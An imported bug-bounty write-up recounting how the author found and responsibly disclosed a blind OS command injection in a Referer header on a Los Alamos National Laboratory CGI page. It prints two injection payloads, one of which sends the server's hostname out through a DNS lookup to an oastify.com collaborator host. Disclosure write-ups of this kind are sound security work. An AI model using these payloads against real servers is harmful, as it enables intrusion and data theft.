---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-11-16_hacking-into-rce-government-server-operated-for-the-us-department-of-energys-nat.md
original_filename: 2020-11-16_hacking-into-rce-government-server-operated-for-the-us-department-of-energys-nat.md
title: Hacking into (RCE) Government Server operated for the US Department of Energy’s
  National Nuclear Security Administration.
category: documents
detected_topics:
- command-injection
- api-security
tags:
- imported
- documents
- command-injection
- api-security
language: en
raw_sha256: 7ad62d6dfb67e3787db85d5212de805f8959b6623cc885303e129f6b2dc38775
text_sha256: f047068ea7ec530a954d859842b51c0adf4f3f1e61b6655bb90a13319061fd45
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Hacking into (RCE) Government Server operated for the US Department of Energy’s National Nuclear Security Administration.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-11-16_hacking-into-rce-government-server-operated-for-the-us-department-of-energys-nat.md
- Source Type: markdown
- Detected Topics: command-injection, api-security
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `7ad62d6dfb67e3787db85d5212de805f8959b6623cc885303e129f6b2dc38775`
- Text SHA256: `f047068ea7ec530a954d859842b51c0adf4f3f1e61b6655bb90a13319061fd45`


## Content

---
title: "Hacking into (RCE) Government Server operated for the US Department of Energy’s National Nuclear Security Administration."
url: "https://medium.com/@shaheenfazim/hacking-into-rce-government-server-operated-for-the-us-department-of-energys-national-nuclear-8aadc2e7e491"
authors: ["Shaheen Fazim"]
programs: ["US Department of Energy"]
bugs: ["RCE", "OS command injection"]
publication_date: "2020-11-16"
added_date: "2022-10-18"
source: "pentester.land/writeups.json"
original_index: 4124
scraped_via: "browseros"
---

# Hacking into (RCE) Government Server operated for the US Department of Energy’s National Nuclear Security Administration.

Hacking into (RCE) Government Server operated for the US Department of Energy’s National Nuclear Security Administration.
Shaheen Fazim
Follow
4 min read
·
Jan 17, 2023

3

1

I
had always been determined to make a name for myself in the field of cyber security. I had already uncovered vulnerabilities in giants like Google and Microsoft, earning my place in their hall of fame. But I felt that there was still more that I could do and I yearned for a greater challenge, so I decided to ethically find vulnerabilities in the Government-operated Servers.

This is a documentation of my journey in finding the easiest RCE (Remote Code Execution) vulnerability in a Government Server, This write-up emphasizes the process rather than the technical details. I’ll be keeping most of the information confidential, for obvious reasons.

Chapter 1: The Hunt
Press enter or click to view image in full size
The crew of the research vessel set out on their journey with high hopes of discovering new species in the deep sea.

I began my search using a widely-used OSINT method called Google Dorking. This technique involves using advanced search operators in Google search to find sensitive information on the internet. I used my custom-made tool url-scraper , to automate this process. This tool helped me scan the internet for most of the .gov site URLs and gather them all into a file for later scans. After hours of searching, I stumbled upon a link to the prestigious Los Alamos National Laboratory (LANL). This laboratory is well-known for its research on the atomic bomb and other top-secret projects, it is most recognized as serving as the birthplace of the atomic bomb.

Chapter 2: Into the Depths
Press enter or click to view image in full size
As they descended deeper into the depths, they began to notice strange disturbances in the water. Suddenly, a massive shadow loomed over the vessel and the crew realized they were being stalked by a giant creature

As I modified my dork to delve deeper into my target, lanl.gov, I came across a CGI directory. CGI, or Common Gateway Interface, is an interface specification that enables web servers to execute an external program, so I thought this should have something interesting. I opened the link, and it was a research paper on nuclear radiation. I read the document, but i didn’t understand a thing and found myself getting lost, so I decided to investigate the URL, which was using an interesting parameter that caught my attention which is used to call the document.

So, I opened up my Burp Suite application and started with basic scans, which came up empty. I then ran a high-level scan, which took longer, but finally, it caught a Blind OS Command Injection on the Referer Header. This vulnerability allows the Referer Header to be injected with malicious OS commands, which can be sent to the server and get executed. This would enable an attacker to remotely execute commands on the server. I modified the request and sent it again to the server, which gave me a response on my Burp collaborator, along with the server IP.

The payload used:

Referer: https://redacted/&'\"`0&nslookup -q=cname 8kt93563ux6d1lyr93ia5i3jva13ptdi.oastify.com.&`’’

Chapter 3: The Megalodon
Press enter or click to view image in full size
Little did they know, they were about to come face to face with the most terrifying creature to ever exist: the megalodon.

I immediately reported the vulnerability to the Department of Energy Responsible Disclosure Program. After a day, they replied by saying that they were unable to reproduce the vulnerability and asked me if I was able to extract data from the server. I checked my report again and found out that my command was being filtered by the original report form. I modified my payload to be shorter and sent it on the report message. This time I was also able to exfiltrate some data from the server as requested as proof for more than just an IP, but I stuck to my moral to not leak any sensitive information, and just exfiltrated the hostname. It was an interesting hostname, named after the extinct specie Megalodon, which for me was a really cool server name.

Get Shaheen Fazim’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Modified Payload:

Referer: https://redacted/&'\"`0&nslookup $(hostname).fo7g7caay4ak5s2ydamh9p7qzh5dt4ht.oastify.com.&`’

A trick learned from https://portswigger.net/web-security/os-command-injection

Chapter 4: A Safe Harbour
Press enter or click to view image in full size
Finally, the crew managed to safely divert the megalodon back into the wild, emerged victorious, and reached their destination: a secluded bay that served as a safe harbour for the research vessel.

After updating the report, the agent was able to reproduce it and then triaged it, by sending me a response :

“Thank you for your submission, we’ve determined this to be valid.

The client will now address this for a fix. Once it is fixed, we will follow-up with you for your verification that the vulnerability is no longer active. When it is confirmed, and with your permission, we’ll add your name to the acknowledgments page.”

After a few days, the issue was fixed and my name was added to the Responsible Disclosure Acknowledgements Page of US Department of Energy . I had accomplished my goal, hacking a Government Server operated for the US Department of Energy’s National Nuclear Security Administration. couldn’t help but feel a sense of accomplishment as I had uncovered a vulnerability in a government server, and helped to fix it before any harm could be done.

Timeline:

December 23, 2022 — Vulnerability reported.

December 28, 2022 — Triaged.

January 8, 2023 — Fixed.

January 9, 2023 — Acknowledged.
